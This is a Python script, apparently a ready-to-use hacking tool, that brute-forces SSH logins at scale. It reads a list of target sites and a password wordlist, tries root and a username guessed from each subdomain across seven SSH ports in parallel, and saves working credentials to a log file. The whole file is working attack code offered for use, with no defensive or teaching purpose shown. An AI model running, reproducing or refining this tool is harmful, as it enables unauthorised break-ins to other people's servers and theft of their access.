import paramiko, colorama, socket, os, sys, platform
from multiprocessing import Pool
from time import time
from colorama import Fore, Style
from platform import system
if system() == 'Linux':
    os.system('clear')
else:
    os.system('cls')
socket.setdefaulttimeout(5)
passwords = open('password.txt').read().splitlines()

print(f"""{Fore.YELLOW}
    ___________      __    _ __ 
   / ____/ ___/_____/ /_  (_) /_
  / /_   \__ \/ ___/ __ \/ / __/
 / __/  ___/ (__  ) / / / / /_  
/_/    /____/____/_/ /_/_/\__/    
{Fore.WHITE}Mass Bruteforce SSH (With root user & auto get username)
""")
listmega = input("Website list: ")
def ssh(host, username, password, port):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(host, port, username, password)
        print(f'{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}] {host}|{username}|{password}|{port} ->{Fore.GREEN} OK {Fore.WHITE}')
        return (host, username, password, port, True)
    except:
        print(f'{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}] {host}|{username}|{password}|{port} ->{Fore.RED} NO {Fore.WHITE}')
        return (host, username, password, port, False)
def worker(host):
    for port in ports:
        for password in passwords:
            result = ssh(host, 'root', password, port)
            if result[4] == False and '.' in host:
                subdomain = host.split('.')[0]
                result = ssh(host, subdomain, password, port)
            if result[4]:
                with open('success.log', 'a') as f:
                    f.write(f'Host: {result[0]} Username: {result[1]} Password: {result[2]} Port: {result[3]}\n')
lines = open(listmega).read().splitlines()
lines = list(set(lines))
# PORT DISINI, LU BISA CUSTOM SENDIRI SESUAI SELERA xD
ports = [22, 222, 2222, 2200, 8022, 122, 4422]
if __name__ == '__main__':
    pool = Pool(10)
    start = time()
    pool.map(worker, lines)
    print('\nDONE! The successful results of the bruteforce process above are saved in succes.txt')
